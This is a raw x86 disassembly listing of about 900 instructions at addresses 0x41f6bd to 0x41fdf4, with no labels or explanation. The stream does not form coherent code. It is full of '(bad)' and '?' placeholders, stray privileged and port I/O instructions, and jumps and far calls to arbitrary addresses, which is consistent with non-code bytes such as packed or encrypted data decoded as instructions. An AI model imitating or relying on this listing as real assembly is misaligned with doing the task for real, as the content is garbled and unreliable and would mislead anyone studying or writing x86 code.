  41f6bd:	adc    DWORD PTR [ecx-0x3b],edi
  41f6c0:	mov    bh,0x66
  41f6c2:	inc    ebx
  41f6c3:	loopne 0x41f688
  41f6c5:	xor    ch,BYTE PTR [ebp-0x45b71fce]
  41f6cb:	ret    0xa7dd
  41f6ce:	mov    bl,0xd7
  41f6d0:	adc    eax,0x2fdb3b52
  41f6d5:	or     al,0x9d
  41f6d7:	or     dl,dl
  41f6d9:	mov    WORD PTR [ebp-0x3],ds
  41f6dc:	mov    ?,ebp
  41f6de:	push   esi
  41f6df:	inc    ecx
  41f6e0:	push   0x472e79ac
  41f6e5:	(bad)  
  41f6e7:	(bad)  
  41f6e8:	dec    esi
  41f6e9:	aas    
  41f6ea:	out    dx,al
  41f6eb:	out    0x65,al
  41f6ed:	rcl    DWORD PTR [eax-0x66092951],cl
  41f6f3:	xchg   ecx,eax
  41f6f4:	fs push ss
  41f6f6:	cmp    DWORD PTR [esi],ecx
  41f6f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6f9:	das    
  41f6fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6fb:	js     0x41f739
  41f6fd:	inc    edx
  41f6fe:	and    al,0x7
  41f700:	in     eax,dx
  41f701:	(bad)  
  41f703:	lock popf 
  41f705:	inc    ecx
  41f706:	icebp  
  41f707:	push   0x924594d8
  41f70c:	jle    0x41f745
  41f70e:	dec    eax
  41f70f:	jecxz  0x41f6ee
  41f711:	and    bl,dl
  41f713:	pop    ds
  41f714:	rol    ch,0x27
  41f717:	sbb    eax,0xf5bbc5c5
  41f71c:	inc    ebx
  41f71d:	pop    ebp
  41f71e:	fwait
  41f71f:	or     eax,DWORD PTR [ecx]
  41f721:	cwde   
  41f722:	push   0xffffffd6
  41f724:	push   esp
  41f725:	fstp   TBYTE PTR fs:[ecx+0xe]
  41f729:	dec    esp
  41f72a:	mov    al,ds:0x676ebab1
  41f72f:	ret    0xc0e1
  41f732:	addr16 xchg esi,eax
  41f734:	pop    ss
  41f735:	jno    0x41f721
  41f737:	lds    edi,FWORD PTR ds:0xa9bcde4f
  41f73d:	cmp    al,0x35
  41f740:	mov    eax,ds:0xd72d794c
  41f745:	add    eax,0x80902072
  41f74a:	add    DWORD PTR [ebx-0xddc8612],ebp
  41f750:	jo     0x41f7a3
  41f752:	lods   eax,DWORD PTR ds:[esi]
  41f753:	push   es
  41f754:	outs   dx,BYTE PTR ds:[esi]
  41f755:	adc    eax,0x43e5d99c
  41f75a:	mov    eax,ds:0x18337da6
  41f75f:	push   edx
  41f760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f761:	js     0x41f735
  41f763:	loope  0x41f712
  41f765:	gs out 0x5c,al
  41f768:	push   esp
  41f769:	sub    DWORD PTR [eax+edx*2],ebx
  41f76c:	pop    esp
  41f76d:	pop    esp
  41f76e:	test   al,0xae
  41f770:	adc    eax,0x88e27a37
  41f775:	ins    BYTE PTR es:[edi],dx
  41f776:	jmp    0x41f77b
  41f778:	and    al,BYTE PTR [edx-0x6c600a08]
  41f77e:	inc    ecx
  41f77f:	xor    eax,0x9608c16
  41f784:	jecxz  0x41f7c3
  41f786:	out    dx,al
  41f787:	xor    DWORD PTR [bp+si],esp
  41f78a:	mov    DWORD PTR [edi+edi*8-0x9adf4f8],0x7a038548
  41f795:	jl     0x41f7b6
  41f797:	outs   dx,DWORD PTR ds:[esi]
  41f798:	or     eax,DWORD PTR [eax]
  41f79a:	test   al,0xb0
  41f79c:	imul   BYTE PTR [ebx+esi*8+0x4361a63b]
  41f7a3:	int3   
  41f7a4:	mov    al,0x7f
  41f7a6:	icebp  
  41f7a7:	xor    DWORD PTR [ecx],0xffffffeb
  41f7aa:	adc    al,0xf5
  41f7ac:	or     dl,ah
  41f7ae:	adc    BYTE PTR [edx],dh
  41f7b0:	in     al,0x4f
  41f7b2:	mov    esi,0x5c533592
  41f7b7:	cld    
  41f7b8:	mov    BYTE PTR [edi-0x17a4306f],0x49
  41f7bf:	push   ebp
  41f7c0:	lea    eax,[esi+0xa]
  41f7c3:	in     eax,0x73
  41f7c5:	sub    eax,0xba6c73f9
  41f7ca:	sbb    al,BYTE PTR [eax+0x766c732a]
  41f7d0:	mov    edx,0x1a94c494
  41f7d5:	lahf   
  41f7d6:	cmc    
  41f7d7:	or     al,0x45
  41f7d9:	mov    eax,?
  41f7db:	call   0x69f9c5c1
  41f7e0:	stos   DWORD PTR es:[edi],eax
  41f7e1:	jecxz  0x41f7de
  41f7e3:	popf   
  41f7e4:	or     al,0xf7
  41f7e6:	test   al,0x5d
  41f7e8:	shl    DWORD PTR [esi],0x26
  41f7eb:	sahf   
  41f7ec:	adc    cl,BYTE PTR [ebx]
  41f7ee:	rcr    cl,1
  41f7f0:	test   eax,0xf6e46da2
  41f7f5:	ja     0x41f827
  41f7f7:	ins    BYTE PTR es:[edi],dx
  41f7f8:	(bad)  
  41f7f9:	and    bl,dl
  41f7fb:	mov    ecx,DWORD PTR [eax+0x59]
  41f7fe:	push   cs
  41f7ff:	mov    eax,0xe03dd364
  41f804:	mov    dl,0xf6
  41f806:	cmp    ebp,DWORD PTR [ecx-0x75b45ea]
  41f80c:	iret   
  41f80d:	xchg   esp,eax
  41f80e:	mov    al,ds:0xd873e9cd
  41f813:	inc    ecx
  41f814:	fsub   st(2),st
  41f816:	fistp  DWORD PTR [esi]
  41f818:	lods   al,BYTE PTR ds:[esi]
  41f819:	dec    edx
  41f81a:	(bad)  
  41f81c:	and    edi,DWORD PTR [eax+0x6e6c973]
  41f822:	out    0xc3,al
  41f824:	sbb    bh,BYTE PTR [esi-0x22]
  41f827:	mov    ds:0x3e082baa,eax
  41f82c:	fidiv  WORD PTR [edi-0x46]
  41f82f:	data16 jb 0x41f87e
  41f832:	fnstsw WORD PTR [ebp+0x77]
  41f835:	test   DWORD PTR [edx],ebp
  41f837:	fs in  al,0x32
  41f83a:	sub    BYTE PTR [ebx+esi*4+0x3c1817fa],dh
  41f841:	test   DWORD PTR ds:0x88c80182,edx
  41f847:	or     edx,DWORD PTR [ecx-0x2a3631ef]
  41f84d:	mov    esi,ecx
  41f84f:	cmp    al,0x79
  41f851:	cld    
  41f852:	sub    al,BYTE PTR [ebp-0x74]
  41f855:	mov    al,0x74
  41f857:	lods   eax,DWORD PTR ds:[esi]
  41f858:	fsubr  DWORD PTR [eax]
  41f85a:	retf   
  41f85b:	mov    al,0x4c
  41f85d:	mov    edx,0x8e62997d
  41f862:	loop   0x41f8c6
  41f864:	jae    0x41f847
  41f866:	sub    BYTE PTR [edi-0x5cdba03e],dl
  41f86c:	push   edx
  41f86d:	mov    ds:0x3baab368,eax
  41f872:	mov    esi,0x99689b95
  41f877:	xor    cl,cl
  41f879:	inc    ebx
  41f87a:	add    al,0xe3
  41f87c:	mov    ah,0x61
  41f87e:	adc    dh,BYTE PTR [edi+0x1a]
  41f881:	dec    edi
  41f882:	je     0x41f84c
  41f884:	in     al,dx
  41f885:	pop    esp
  41f886:	rcr    BYTE PTR [eax+0x552f1f02],0xe9
  41f88d:	pop    eax
  41f88e:	ror    DWORD PTR [edi+0x4b],0x86
  41f892:	adc    al,0x4d
  41f894:	enter  0x75ab,0x9c
  41f898:	mov    eax,ds:0x9bc497d0
  41f89d:	pop    ecx
  41f89e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f89f:	pop    esp
  41f8a0:	sahf   
  41f8a1:	shl    DWORD PTR [edi+0x60512f4d],1
  41f8a7:	push   ds
  41f8a8:	adc    BYTE PTR [esi],dh
  41f8aa:	xor    bl,BYTE PTR [eax-0x60]
  41f8ad:	lahf   
  41f8ae:	sbb    BYTE PTR [ebp-0x28],dh
  41f8b1:	add    al,BYTE PTR [ecx-0x412919a4]
  41f8b7:	jmp    0xe4ffaa00
  41f8bc:	repz jbe 0x41f928
  41f8bf:	jmp    0x491d:0x2e7fd6a1
  41f8c6:	cli    
  41f8c7:	or     cl,BYTE PTR [edx]
  41f8c9:	sbb    cl,BYTE PTR [ecx-0x17]
  41f8cc:	fwait
  41f8cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8ce:	cli    
  41f8cf:	stos   BYTE PTR es:[edi],al
  41f8d0:	rcr    DWORD PTR ds:0x515e927,0xa1
  41f8d7:	push   eax
  41f8d8:	xor    bh,BYTE PTR [edx+ebp*1]
  41f8db:	adc    al,cl
  41f8dd:	jae    0x41f8b9
  41f8df:	jge    0x41f95c
  41f8e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8e2:	outs   dx,BYTE PTR ds:[esi]
  41f8e3:	xor    eax,DWORD PTR [edx+0x24]
  41f8e6:	outs   dx,BYTE PTR ds:[esi]
  41f8e7:	dec    edi
  41f8e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8e9:	ins    DWORD PTR es:[edi],dx
  41f8ea:	jle    0x41f8d3
  41f8ec:	push   ebp
  41f8ed:	jnp    0x41f94d
  41f8ef:	adc    BYTE PTR [edx],ah
  41f8f1:	mov    ds:0xe86a3794,eax
  41f8f6:	adc    ebx,DWORD PTR [edx+0x5bc753aa]
  41f8fc:	addr16 dec esi
  41f8fe:	les    ebp,FWORD PTR [esp+eax*8]
  41f901:	(bad)  
  41f903:	faddp  st(2),st
  41f905:	add    ebx,DWORD PTR [edi-0x128c9960]
  41f90b:	(bad)  [edi+0x1a]
  41f90e:	repnz sti 
  41f910:	stos   BYTE PTR es:[edi],al
  41f911:	jl     0x41f982
  41f913:	sbb    eax,0xec9f0eec
  41f918:	(bad)  
  41f919:	sub    BYTE PTR [eax],al
  41f91b:	(bad)  
  41f91c:	(bad)  [ebx+edx*2]
  41f91f:	in     al,dx
  41f920:	mov    edx,DWORD PTR [ecx]
  41f922:	test   DWORD PTR [edi-0x2cadd851],0x643e478d
  41f92c:	mov    ds:0x882540e2,eax
  41f931:	xor    esp,0x73ba2470
  41f937:	aad    0xb8
  41f939:	inc    eax
  41f93a:	mov    ds:0xcb2bb540,eax
  41f93f:	in     al,0x5f
  41f941:	in     eax,0xd1
  41f943:	mov    edx,0xe3723763
  41f948:	pop    esp
  41f949:	cmp    al,0xb5
  41f94b:	mov    ah,0xf0
  41f94d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f94e:	jns    0x41f8ee
  41f950:	jae    0x41f97e
  41f952:	mov    edi,0x6d51ea75
  41f957:	call   0x2fc3:0x32da19d5
  41f95e:	xor    ecx,DWORD PTR [ebx-0x70465ba8]
  41f964:	mov    ebx,0x249d189a
  41f969:	ficomp WORD PTR [edi+ebx*1+0x1b]
  41f96d:	int    0x80
  41f96f:	js     0x41f9df
  41f971:	push   cs
  41f972:	add    dl,al
  41f974:	jecxz  0x41f996
  41f976:	xchg   edi,eax
  41f977:	jg     0x41f92d
  41f979:	pop    edi
  41f97a:	rcl    BYTE PTR [edi+0x4ba5abc0],1
  41f980:	idiv   DWORD PTR cs:[ecx+0x0]
  41f984:	enter  0x964c,0xa
  41f988:	mov    ah,0xcb
  41f98a:	das    
  41f98b:	ret    
  41f98c:	mov    esp,0x79633430
  41f991:	mov    ah,0xd8
  41f993:	or     al,0xaf
  41f995:	inc    esp
  41f996:	fst    st(2)
  41f998:	push   edx
  41f999:	jo     0x41f95e
  41f99b:	xchg   DWORD PTR gs:[esi+0x2f],esp
  41f99f:	jno    0x41f985
  41f9a1:	jae    0x41f9c6
  41f9a3:	in     eax,dx
  41f9a4:	mov    ch,0x8c
  41f9a6:	mov    ah,0x60
  41f9a8:	fstp   QWORD PTR ds:0x86e3eb26
  41f9ae:	std    
  41f9af:	ror    BYTE PTR [edi+ecx*2-0x53],cl
  41f9b3:	cmp    al,0xe4
  41f9b5:	push   ebx
  41f9b6:	sub    ecx,esi
  41f9b8:	xchg   esi,eax
  41f9b9:	and    esp,DWORD PTR [ecx]
  41f9bb:	sub    eax,ecx
  41f9bd:	push   edi
  41f9be:	ins    DWORD PTR es:[edi],dx
  41f9bf:	push   ebp
  41f9c0:	dec    eax
  41f9c1:	aas    
  41f9c2:	jb     0x41f9dc
  41f9c4:	aam    0x1e
  41f9c6:	retf   0x351c
  41f9c9:	mov    ecx,0xd5f40ea7
  41f9ce:	aam    0x10
  41f9d0:	xor    DWORD PTR [edi],0xfffffffa
  41f9d3:	adc    al,0xf3
  41f9d5:	je     0x41f96f
  41f9d7:	dec    esi
  41f9d8:	and    al,0x46
  41f9da:	sbb    BYTE PTR [eax+0x18],dl
  41f9dd:	es jmp 0xab9c:0xa691057e
  41f9e5:	out    0xee,eax
  41f9e7:	xor    al,BYTE PTR [ecx-0x26956c18]
  41f9ed:	hlt    
  41f9ee:	push   ebp
  41f9ef:	jb     0x41fa66
  41f9f1:	call   0x8b4db0a8
  41f9f6:	ret    
  41f9f7:	mov    bl,0xfd
  41f9f9:	mov    ecx,0x940d269c
  41f9fe:	sar    ch,0x22
  41fa01:	sub    al,0x50
  41fa03:	jg     0x41f9fe
  41fa05:	mov    WORD PTR [ecx],cs
  41fa07:	lods   al,BYTE PTR ds:[esi]
  41fa08:	or     eax,0x6c152449
  41fa0d:	lods   eax,DWORD PTR ds:[esi]
  41fa0e:	sbb    DWORD PTR [eax],edi
  41fa10:	jecxz  0x41f9af
  41fa12:	jmp    0xea6c:0x195d7bd9
  41fa19:	cmp    al,cl
  41fa1b:	aam    0x18
  41fa1d:	inc    ebp
  41fa1e:	sub    DWORD PTR [eax-0x5b],ecx
  41fa21:	aas    
  41fa22:	je     0x41fa2f
  41fa24:	and    ch,BYTE PTR [ebx]
  41fa26:	ret    0x4cd1
  41fa29:	stos   DWORD PTR es:[edi],eax
  41fa2a:	cmc    
  41fa2b:	xchg   ecx,eax
  41fa2c:	push   edx
  41fa2d:	scas   al,BYTE PTR es:[edi]
  41fa2e:	mov    ds:0x85f7c451,eax
  41fa33:	xchg   ecx,eax
  41fa34:	ret    
  41fa35:	lods   al,BYTE PTR ds:[esi]
  41fa36:	fnsave [esi]
  41fa38:	xchg   ebp,eax
  41fa39:	adc    eax,ebp
  41fa3b:	add    ch,BYTE PTR [ebx]
  41fa3d:	sub    BYTE PTR [ebx+eiz*8+0x0],dl
  41fa41:	repz mov cl,0x65
  41fa45:	(bad)  
  41fa46:	stos   DWORD PTR es:[edi],eax
  41fa47:	adc    eax,0x3f7342df
  41fa4c:	pop    ss
  41fa4d:	stc    
  41fa4e:	push   0xffffffd6
  41fa50:	pop    edi
  41fa51:	mov    edi,0x27926484
  41fa56:	xchg   DWORD PTR [esp+ebp*4+0xe2fee20],edi
  41fa5d:	and    BYTE PTR [ecx-0x385b2bb0],0x9d
  41fa64:	lods   eax,DWORD PTR ds:[esi]
  41fa65:	push   0xdcdadcc8
  41fa6a:	xchg   edi,eax
  41fa6b:	stos   DWORD PTR es:[edi],eax
  41fa6c:	enter  0xe48b,0x10
  41fa70:	sub    BYTE PTR [ecx-0x60],cl
  41fa73:	jb     0x41fab6
  41fa75:	dec    esp
  41fa76:	retf   0x5960
  41fa79:	cli    
  41fa7a:	out    0x25,eax
  41fa7c:	add    ecx,edi
  41fa7e:	pop    edi
  41fa7f:	and    DWORD PTR [edx+0x5],eax
  41fa82:	shl    DWORD PTR [esi+0x58],0xb1
  41fa86:	and    ch,BYTE PTR [edi+eax*1+0x641645fa]
  41fa8d:	add    bh,ah
  41fa8f:	cmc    
  41fa90:	pop    ss
  41fa91:	daa    
  41fa92:	pop    ss
  41fa93:	xchg   DWORD PTR [ebx],esp
  41fa95:	pusha  
  41fa96:	cwde   
  41fa97:	push   esp
  41fa98:	outs   dx,BYTE PTR ds:[esi]
  41fa99:	inc    ebx
  41fa9a:	mov    DWORD PTR [ebx+0x223ebb88],ebx
  41faa0:	jle    0x41fa32
  41faa2:	and    ch,BYTE PTR [ebx]
  41faa4:	jbe    0x41fac0
  41faa6:	ror    DWORD PTR [edx*2-0x233a377d],0xe6
  41faae:	jmp    0x41fadf
  41fab0:	aam    0x8b
  41fab2:	and    dh,BYTE PTR [edi]
  41fab4:	jb     0x41fafe
  41fab6:	outs   dx,DWORD PTR ds:[esi]
  41fab7:	mov    bl,0xf4
  41fab9:	inc    ecx
  41faba:	push   cs
  41fabb:	sahf   
  41fabc:	dec    ebx
  41fabd:	jnp    0x41fa99
  41fabf:	xchg   edx,eax
  41fac0:	(bad)
  41fac3:	into   
  41fac4:	cmp    edx,ecx
  41fac6:	xchg   esp,eax
  41fac7:	mov    edx,0x32ba3c7c
  41facc:	sub    eax,DWORD PTR [ebp+edx*2+0xd04f59c]
  41fad3:	cmp    esp,ebp
  41fad5:	icebp  
  41fad6:	push   ss
  41fad7:	es out dx,al
  41fad9:	inc    eax
  41fada:	div    DWORD PTR [eax]
  41fadc:	push   edx
  41fadd:	es cmp ah,dl
  41fae0:	sbb    eax,0xda6d98d4
  41fae5:	mov    BYTE PTR [esi+ebp*4+0x15b36aad],dh
  41faec:	repz fstp TBYTE PTR [edi]
  41faef:	pop    ebp
  41faf0:	xchg   esi,eax
  41faf1:	jb     0x41fb5e
  41faf3:	and    al,0xd5
  41faf5:	mov    bl,0xc3
  41faf7:	dec    esi
  41faf8:	add    edx,DWORD PTR [ecx+0x6b388346]
  41fafe:	sbb    BYTE PTR [esp+esi*2],0x5e
  41fb02:	adc    bl,dl
  41fb04:	cwde   
  41fb05:	pop    esp
  41fb06:	(bad)  
  41fb07:	jmp    0x70f52b8
  41fb0c:	lea    ecx,[ecx+0x60]
  41fb0f:	jbe    0x41fb03
  41fb11:	fisttp WORD PTR [edx-0x9]
  41fb14:	mov    WORD PTR [edi+0x703d0fc5],?
  41fb1a:	fsubr  st(7),st
  41fb1c:	cdq    
  41fb1d:	fs and eax,esi
  41fb20:	xor    eax,esi
  41fb22:	dec    edx
  41fb23:	jo     0x41fb7b
  41fb25:	push   es
  41fb26:	push   esi
  41fb27:	repz call 0x7187992b
  41fb2d:	inc    ebx
  41fb2e:	dec    edx
  41fb2f:	stos   BYTE PTR es:[edi],al
  41fb30:	(bad)  
  41fb32:	mov    ch,BYTE PTR [edx]
  41fb34:	call   0xbd686d5b
  41fb39:	lock aaa 
  41fb3b:	and    ah,BYTE PTR [ebx-0x72]
  41fb3e:	ins    DWORD PTR es:[edi],dx
  41fb3f:	shr    DWORD PTR [ecx],0xe3
  41fb42:	xor    dl,bh
  41fb44:	jle    0x41facd
  41fb46:	aas    
  41fb47:	ins    BYTE PTR es:[edi],dx
  41fb48:	and    BYTE PTR [ecx],ch
  41fb4a:	jnp    0x41faed
  41fb4c:	dec    edx
  41fb4d:	sbb    al,0x42
  41fb4f:	popa   
  41fb50:	inc    eax
  41fb51:	ss cwde 
  41fb53:	push   ss
  41fb54:	pop    ecx
  41fb55:	push   ebx
  41fb56:	sub    BYTE PTR [esi+edi*8+0x1176f29c],cl
  41fb5d:	cli    
  41fb5e:	push   DWORD PTR [edi-0x48]
  41fb61:	and    al,0xc0
  41fb63:	scas   eax,DWORD PTR es:[edi]
  41fb64:	popa   
  41fb65:	or     eax,0x748d3cb
  41fb6a:	jae    0x41fb1a
  41fb6c:	pop    ds
  41fb6d:	jge    0x41fba1
  41fb6f:	out    dx,eax
  41fb70:	xchg   edx,eax
  41fb71:	xchg   BYTE PTR [ebx+0x8],dl
  41fb74:	jl     0x41fb63
  41fb76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb77:	and    ecx,esi
  41fb79:	inc    eax
  41fb7a:	callw  0xb11d
  41fb7e:	out    0x2d,al
  41fb80:	idiv   DWORD PTR fs:[esi+edx*2]
  41fb84:	neg    BYTE PTR ds:0x9f47f5fc
  41fb8a:	daa    
  41fb8b:	jle    0x41fbec
  41fb8d:	mov    al,0x14
  41fb8f:	xchg   edx,eax
  41fb90:	mov    dh,0x6d
  41fb92:	jo     0x41fb51
  41fb94:	pop    esp
  41fb95:	or     bl,BYTE PTR [ecx]
  41fb97:	xor    al,0x8e
  41fb99:	push   0x9f050f1b
  41fb9e:	jne    0x41fb7a
  41fba0:	gs icebp 
  41fba2:	jmp    0xf285662f
  41fba7:	cmp    ah,cl
  41fba9:	imul   ecx,DWORD PTR cs:[ebx],0x821d4afa
  41fbb0:	sub    dl,BYTE PTR [esi+0x9]
  41fbb3:	enter  0x170b,0x53
  41fbb7:	mov    edx,0x9eb47a3b
  41fbbc:	push   0xaa89976
  41fbc1:	popf   
  41fbc2:	pop    ebp
  41fbc3:	push   esp
  41fbc4:	push   cs
  41fbc5:	inc    ebp
  41fbc6:	inc    ebp
  41fbc7:	sti    
  41fbc8:	mov    edi,0x3dcabcd6
  41fbcd:	out    dx,al
  41fbce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbcf:	fs pop esi
  41fbd1:	jnp    0x41fbcd
  41fbd3:	dec    esp
  41fbd4:	pop    esp
  41fbd5:	cmp    BYTE PTR [edi],ch
  41fbd7:	into   
  41fbd8:	pusha  
  41fbd9:	outs   dx,BYTE PTR ds:[esi]
  41fbda:	out    dx,al
  41fbdb:	cli    
  41fbdc:	lahf   
  41fbdd:	mov    ecx,DWORD PTR [esi+0x65449d02]
  41fbe3:	add    eax,0x265b0cec
  41fbe8:	clc    
  41fbe9:	repz cwde 
  41fbeb:	push   ecx
  41fbec:	sub    DWORD PTR [eax+0xaf14c15],0xffffffa8
  41fbf3:	jl     0x41fbc0
  41fbf5:	dec    eax
  41fbf6:	sahf   
  41fbf7:	pushf  
  41fbf8:	sub    eax,0x7b2c9daf
  41fbfd:	aam    0xea
  41fbff:	pop    esp
  41fc00:	and    esi,ecx
  41fc02:	xchg   edi,eax
  41fc03:	hlt    
  41fc04:	loop   0x41fc33
  41fc06:	inc    ebp
  41fc07:	(bad)  
  41fc08:	or     DWORD PTR [esi+eiz*8],esi
  41fc0b:	ds nop
  41fc0d:	jnp    0x41fc5f
  41fc0f:	mov    ah,0xea
  41fc11:	and    DWORD PTR [edx],edx
  41fc13:	add    bl,BYTE PTR [ebx+0x3a]
  41fc16:	xchg   ebp,eax
  41fc17:	call   0x4bb49786
  41fc1c:	jne    0x41fbb5
  41fc1e:	or     esi,0xffffff96
  41fc21:	sti    
  41fc22:	cmp    eax,0xd2abe9af
  41fc27:	pusha  
  41fc28:	dec    esp
  41fc29:	jno    0x41fbc2
  41fc2b:	fwait
  41fc2c:	jle    0x41fbdf
  41fc2e:	inc    esp
  41fc2f:	loope  0x41fc92
  41fc31:	jns    0x41fc8d
  41fc33:	xchg   ebx,eax
  41fc34:	fidivr WORD PTR [esi-0x3c]
  41fc37:	loope  0x41fbeb
  41fc39:	aaa    
  41fc3a:	out    dx,eax
  41fc3b:	shl    BYTE PTR [edx],0x2c
  41fc3e:	sahf   
  41fc3f:	mov    ah,0xcb
  41fc41:	popa   
  41fc42:	clc    
  41fc43:	dec    edi
  41fc44:	aad    0x47
  41fc46:	sub    DWORD PTR [ebx],eax
  41fc48:	repnz aaa 
  41fc4a:	fisubr WORD PTR [ecx+0x5b]
  41fc4d:	push   ss
  41fc4e:	and    ebp,DWORD PTR [edi+ebp*1+0x19]
  41fc52:	jp     0x41fc59
  41fc54:	pop    es
  41fc55:	jle    0x41fc6e
  41fc57:	popf   
  41fc58:	leave  
  41fc59:	outs   dx,DWORD PTR ds:[esi]
  41fc5a:	ss adc al,0x7d
  41fc5d:	ffree  st(3)
  41fc5f:	add    eax,0x2f9b606f
  41fc64:	dec    ebx
  41fc65:	rol    DWORD PTR [si-0x57],cl
  41fc69:	mov    ebx,0x6a646264
  41fc6e:	sbb    DWORD PTR [ecx],edx
  41fc70:	mov    DWORD PTR [esi-0x36219bf5],ebx
  41fc76:	daa    
  41fc77:	pop    ss
  41fc78:	outs   dx,BYTE PTR ds:[esi]
  41fc79:	pop    ecx
  41fc7a:	inc    ebp
  41fc7b:	add    DWORD PTR [ecx],0x613f0014
  41fc81:	lock dec edx
  41fc83:	xor    al,0xfe
  41fc85:	lods   eax,DWORD PTR ds:[esi]
  41fc86:	mov    dl,0x15
  41fc88:	push   0xffffffa1
  41fc8a:	daa    
  41fc8b:	mov    cs,WORD PTR [edi+ebx*1]
  41fc8e:	daa    
  41fc8f:	fldcw  WORD PTR [edx+0x5]
  41fc92:	jg     0x41fcf4
  41fc94:	mov    bl,0x54
  41fc96:	rcl    cl,1
  41fc98:	loop   0x41fc2d
  41fc9a:	push   ss
  41fc9b:	jo     0x41fc67
  41fc9d:	mov    BYTE PTR [edx],dh
  41fc9f:	inc    edi
  41fca0:	out    dx,eax
  41fca1:	ins    DWORD PTR es:[edi],dx
  41fca2:	jnp    0x41fcb6
  41fca4:	xlat   BYTE PTR ds:[ebx]
  41fca5:	adc    eax,0x61144e38
  41fcaa:	mov    eax,ds:0x9847cd16
  41fcaf:	push   edi
  41fcb0:	push   ds
  41fcb1:	mov    ebp,0x97676078
  41fcb6:	mov    ebx,0x8c376561
  41fcbb:	dec    DWORD PTR [eax]
  41fcbd:	mov    ch,0xd5
  41fcbf:	fimul  WORD PTR [ebx+0x4a2646c6]
  41fcc5:	popa   
  41fcc6:	xor    al,0xf5
  41fcc8:	add    al,0xd4
  41fcca:	aad    0x30
  41fccc:	adc    BYTE PTR [esi],bl
  41fcce:	xlat   BYTE PTR ds:[ebx]
  41fccf:	mov    BYTE PTR [eax],0x34
  41fcd2:	mov    bl,0xdf
  41fcd4:	push   0x99ee2cca
  41fcd9:	mov    bh,0xe9
  41fcdb:	adc    esi,DWORD PTR [edi]
  41fcdd:	mov    edi,0xb881a5b3
  41fce2:	retf   0x3884
  41fce5:	xor    ah,dh
  41fce7:	es data16 jg 0x41fce2
  41fceb:	cdq    
  41fcec:	(bad)  
  41fced:	fstp   QWORD PTR [eax]
  41fcef:	jae    0x41fd3b
  41fcf1:	enter  0x73c3,0x14
  41fcf5:	bound  esi,QWORD PTR [ecx]
  41fcf7:	mov    ds:0x68c4e80c,eax
  41fcfc:	daa    
  41fcfd:	and    DWORD PTR [ecx+0x7a],ebx
  41fd00:	adc    bx,bp
  41fd03:	sub    eax,DWORD PTR [eax]
  41fd05:	fnsave [edx]
  41fd07:	mov    cl,bl
  41fd09:	imul   esp,DWORD PTR [edi+0x19],0xffffff89
  41fd0d:	sub    DWORD PTR [ecx+0x64677365],ebx
  41fd13:	add    eax,0x8e1950e7
  41fd18:	lds    esi,FWORD PTR [edi]
  41fd1a:	rcl    DWORD PTR [edi-0x2d4c2375],0x8d
  41fd21:	repz adc al,0xf4
  41fd24:	popf   
  41fd25:	sub    eax,0x5284afa5
  41fd2a:	mov    ebx,0xa57ffcf2
  41fd2f:	cmp    dl,BYTE PTR [esi]
  41fd31:	lock std 
  41fd33:	bound  edx,QWORD PTR [edx+0x15]
  41fd36:	cmp    al,0xb7
  41fd38:	mov    ebp,0xdff6621e
  41fd3d:	adc    eax,0xe5cbf0b5
  41fd42:	test   al,0x58
  41fd45:	data16 (bad) 
  41fd47:	mov    eax,ds:0xcac83156
  41fd4c:	test   eax,0x10b4f7d
  41fd51:	sub    ebp,DWORD PTR [esi]
  41fd53:	mov    edi,0x76dac2c9
  41fd58:	(bad)  
  41fd59:	pop    ebp
  41fd5a:	iret   
  41fd5b:	repz push ecx
  41fd5d:	push   0x5cbc2304
  41fd62:	jecxz  0x41fd01
  41fd64:	push   ds
  41fd65:	jne    0x41fd13
  41fd67:	shr    DWORD PTR [edx+esi*2-0x6b682041],cl
  41fd6e:	add    al,0xa7
  41fd70:	adc    eax,0x37c9f864
  41fd75:	and    al,0x23
  41fd77:	dec    ecx
  41fd78:	stc    
  41fd79:	jge    0x41fd88
  41fd7b:	mov    DWORD PTR [edi],edx
  41fd7d:	jl     0x41fd22
  41fd7f:	jbe    0x41fd1d
  41fd81:	or     BYTE PTR [ecx+0x20],dh
  41fd84:	pushf  
  41fd85:	mov    DWORD PTR [ecx-0x68f5aaea],edx
  41fd8b:	push   ebp
  41fd8c:	lds    ecx,FWORD PTR [edx]
  41fd8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd8f:	repnz mov eax,0x9f99d540
  41fd95:	pop    edi
  41fd96:	adc    al,0x71
  41fd98:	dec    ebp
  41fd99:	xchg   esp,eax
  41fd9a:	and    eax,0x395a1893
  41fd9f:	pusha  
  41fda0:	xchg   ebx,eax
  41fda1:	rol    DWORD PTR [ebx-0x26],cl
  41fda4:	dec    edi
  41fda5:	leave  
  41fda6:	jge    0x41fd93
  41fda8:	ror    DWORD PTR [esi-0x3aa5b3b3],1
  41fdae:	jnp    0x41fe14
  41fdb0:	or     ecx,DWORD PTR [ebp-0x7e]
  41fdb3:	clc    
  41fdb4:	sub    BYTE PTR [ebp+0x63e6182e],ah
  41fdba:	jge    0x41fe12
  41fdbc:	or     al,0xdf
  41fdbe:	mov    ah,0x6a
  41fdc0:	inc    eax
  41fdc2:	mov    ecx,DWORD PTR [eax]
  41fdc4:	mov    WORD PTR [edi],gs
  41fdc6:	test   eax,0xbae50fce
  41fdcb:	add    DWORD PTR [esi+0x20],0xffffff97
  41fdcf:	outs   dx,BYTE PTR ds:[esi]
  41fdd0:	sbb    DWORD PTR [ebx-0x3b965a98],eax
  41fdd6:	sbb    al,0x56
  41fdd8:	inc    edx
  41fdd9:	pop    esp
  41fdda:	xchg   BYTE PTR [ebx],dh
  41fddc:	aad    0xf1
  41fdde:	add    al,0x1c
  41fde0:	and    esi,eax
  41fde2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fde3:	xlat   BYTE PTR ds:[ebx]
  41fde4:	xor    dh,BYTE PTR [esi+0xb]
  41fde7:	cmc    
  41fde8:	and    DWORD PTR gs:[edx],0x7847de03
  41fdef:	mov    al,ds:0x2ffce72e
  41fdf4:	mov    ecx,0x638350eb
